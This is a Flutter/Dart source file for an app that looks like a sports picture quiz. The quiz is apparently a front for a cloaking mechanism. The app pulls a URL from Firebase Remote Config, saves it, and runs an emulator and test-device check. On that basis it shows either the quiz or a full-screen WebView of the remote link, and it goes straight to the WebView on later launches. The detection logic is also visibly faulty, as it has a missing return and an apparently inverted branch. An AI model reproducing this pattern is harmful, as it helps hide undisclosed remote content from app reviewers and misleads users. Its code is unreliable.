import 'dart:convert';
import 'dart:math';
import 'dart:io';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:hive/hive.dart';
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'firebase_options.dart';
import 'web_view.dart';
import 'package:path_provider/path_provider.dart';
import 'quiz_data.dart';
import 'package:device_info_plus/device_info_plus.dart';





void main() async{

try{


  runApp(MaterialApp(home: WebLoad()));
}
catch(e)
  {
    print(e);
    print("eror");
    runApp(MaterialApp(home: WebLoad()));
  }


}


class WebLoad extends StatefulWidget {
  const WebLoad({super.key});
  @override
  State<WebLoad> createState() => _WebLoad();
}


class _WebLoad  extends State<WebLoad> {



  @override
  initState() {
    super.initState();
    checkLinc();
  }



  checkLinc()async
  {
    final documentDirectory = await getApplicationDocumentsDirectory();
    Hive.init(documentDirectory.path);
    var box = await Hive.openBox('linkStorage');
    var link = await box.get('link');
    print(link.toString());
    if(link.toString()!='null')
    {

      Navigator
          .of(context)
          .pushReplacement(new MaterialPageRoute(builder: (BuildContext context) => WebView(link)));

      // Navigator.push(
      //     context,
      //     MaterialPageRoute(builder: (context) => WebView(link)));

    }

  }



  resultDevice()async
  {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    final em = await deviceInfo.androidInfo;
    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;
    var result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        em.brand.contains('google')||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains("nox"));
    if (result) return true;
    result = result ||
        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
  }





  checkLoadFirebase()async
  {

    WidgetsFlutterBinding.ensureInitialized();
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );

    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();
    print(remoteConfig.getString('link'));
var linkFirebase = remoteConfig.getString('link');
String link = jsonDecode(linkFirebase)["link"];

if(link!="")
  {
    var check = await resultDevice();

    final documentDirectory = await getApplicationDocumentsDirectory();
    Hive.init(documentDirectory.path);
    var box = await Hive.openBox('linkStorage');
    await box.put('link', link);

    print(check);
    //check = false;
    if(check)
      {

        Navigator
            .of(context)
            .pushReplacement(new MaterialPageRoute(builder: (BuildContext context) => WebView(link)));



        // Navigator.push(
        //     context,
        //     MaterialPageRoute(builder: (context) => WebView(link)));
      }
    else
      {


        Navigator
            .of(context)
            .pushReplacement(new MaterialPageRoute(builder: (BuildContext context) => SportHome()));


        // Navigator.push(
        //     context,
        //     MaterialPageRoute(builder: (context) => SportHome()));
      }
  }
  }



  @override
  Widget build(BuildContext context) {
    return
        Scaffold(
          backgroundColor: Colors.cyanAccent,
          body: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [const Text("To work the application, you need to connect to the Internet", style: TextStyle(fontWeight: FontWeight.bold, color: Colors.red),), ElevatedButton(onPressed: (){
              checkLoadFirebase();
              }, child:const Text("Check network"))],
          ),
        );
  }
}




class WebView extends StatelessWidget {
  final String link;

   WebView(this.link);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(home: InfoPong(bloc: link,));
  }
}



class SportHome extends StatefulWidget {
  const SportHome({super.key});
  @override
  State<SportHome> createState() => _SportHomeState();
}

class _SportHomeState  extends State<SportHome>
{

int points = 0;
  int checkQuiz = 0;
  List quizRandomF = QuizData().questions;


  loadQuiz()
  {
   List quiz = QuizData().questions;
   List quizRandom = [];
   int intValue = 0;
   String buff = '';
    int quizLength = quiz.length;
   for(int i = 0; i < quizLength; i++)
     {
      // print(i);
       if(quiz.length - 1 !=0)
         {
           intValue = Random().nextInt(quiz.length - 1);
         }
       else
         {intValue = 0;}
       quizRandom.add(quiz[intValue]);
       quiz.removeAt(intValue);
       for(int u = 0; u < 4; u++)
       {
         intValue = Random().nextInt(quizRandom[i]['responses'].length -1);
         buff = quizRandom[i]['responses'][u];
         quizRandom[i]['responses'][u] = quizRandom[i]['responses'][intValue];
         quizRandom[i]['responses'][intValue] = buff;
       }
     }
   quizRandomF = quizRandom;
 //  print(quizRandom.length);
  }


  responseAccept(reponce, reference)
  {
    if(reponce == reference)
      {
        points  = points + 10;
      }
    if(checkQuiz>quizRandomF.length-2)
      {
        String text = "You points: $points\nGoog result!";
           showMyDialog(context, text);
      }
    else{
      setState(() {
        ++checkQuiz;
      });
    }
  }



  @override
  Widget build(BuildContext context) {
    return
      Stack(
        children: <Widget>[
      Image.asset(
      "assets/background.png",
        height: MediaQuery.of(context).size.height,
        width: MediaQuery.of(context).size.width,
        fit: BoxFit.cover,
      ),
    Scaffold(
        backgroundColor: Colors.transparent,
      body: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [



          Container(
            margin: const EdgeInsets.all(10.0),
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
                color: Colors.green[200],
                borderRadius: BorderRadius.circular(40),
                border: Border.all(color: Colors.greenAccent, width: 5)),
            child: InkWell(
              child: Text(quizRandomF[checkQuiz]['question'], style: const TextStyle(fontWeight: FontWeight.bold, ),),
            ),
          ),

          // Container(
          //   margin: const EdgeInsets.all(10.0),
          //   child: Text(quizRandomF[checkQuiz]['question'], style: TextStyle(fontWeight: FontWeight.bold, ),),
          // )
           Image(image: AssetImage('assets/'+quizRandomF[checkQuiz]['image'])),

          Container(
              margin: const EdgeInsets.all(10.0),
              child:SizedBox(
                width: double.infinity,
                height: 25.0,
                child: ElevatedButton(
                  style: const ButtonStyle(backgroundColor: MaterialStatePropertyAll<Color>(Colors.amber)),
                  onPressed: () {responseAccept(quizRandomF[checkQuiz]['responses'][0], quizRandomF[checkQuiz]['image'].substring(0, quizRandomF[checkQuiz]['image'].length-4));},
                  child: Text(quizRandomF[checkQuiz]['responses'][0], style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.black ),),
                ),
              ),
          ),
          Container(
              margin: const EdgeInsets.all(10.0),
              child: SizedBox(
                width: double.infinity,
                height: 25.0,
                child: ElevatedButton(
                  style: const ButtonStyle(backgroundColor: MaterialStatePropertyAll<Color>(Colors.amber)),
                  onPressed: () {responseAccept(quizRandomF[checkQuiz]['responses'][1], quizRandomF[checkQuiz]['image'].substring(0, quizRandomF[checkQuiz]['image'].length-4));},
                  child: Text(quizRandomF[checkQuiz]['responses'][1], style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.black ),),
                ),
              ),
          ),
        Container(
          margin: const EdgeInsets.all(10.0),
          child:SizedBox(
            width: double.infinity,
            height: 25.0,
            child: ElevatedButton(
              style: const ButtonStyle(backgroundColor: MaterialStatePropertyAll<Color>(Colors.amber)),
              onPressed: () {responseAccept(quizRandomF[checkQuiz]['responses'][2], quizRandomF[checkQuiz]['image'].substring(0, quizRandomF[checkQuiz]['image'].length-4));},
              child: Text(quizRandomF[checkQuiz]['responses'][2], style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.black ),),
            ),
          ),
        ),


        Container(
          margin: const EdgeInsets.all(10.0),
          child: SizedBox(
            width: double.infinity,
            height: 25.0,
            child: ElevatedButton(
              style: const ButtonStyle(backgroundColor: MaterialStatePropertyAll<Color>(Colors.amber)),
              onPressed: () {responseAccept(quizRandomF[checkQuiz]['responses'][3], quizRandomF[checkQuiz]['image'].substring(0, quizRandomF[checkQuiz]['image'].length-4));},
              child: Text(quizRandomF[checkQuiz]['responses'][3], style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.black ),),
            ),
          ),
        ),
        ],

      )
    )
        ],
      );
  }









showMyDialog(BuildContext context, text) {
  showDialog(
      context: context,
      builder: (BuildContext context){
        return AlertDialog(
          backgroundColor: Colors.orange,
          content:Column(
            mainAxisAlignment: MainAxisAlignment.center,
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
            const Icon(Icons.accessibility_new_sharp),
            Text(
            text,
          ),],) ,
          actions: <Widget>[
            ElevatedButton(
              style: const ButtonStyle(backgroundColor: MaterialStatePropertyAll<Color>(Colors.amber)),
              onPressed: () {
                Navigator.push(
                    context, MaterialPageRoute(builder: (context) => const SportHome()));
              },
              child: const Text("I'll take the quiz again!", style: TextStyle(fontWeight: FontWeight.bold, color: Colors.black ),), ),


          ],
        );
      }
  );
}







}








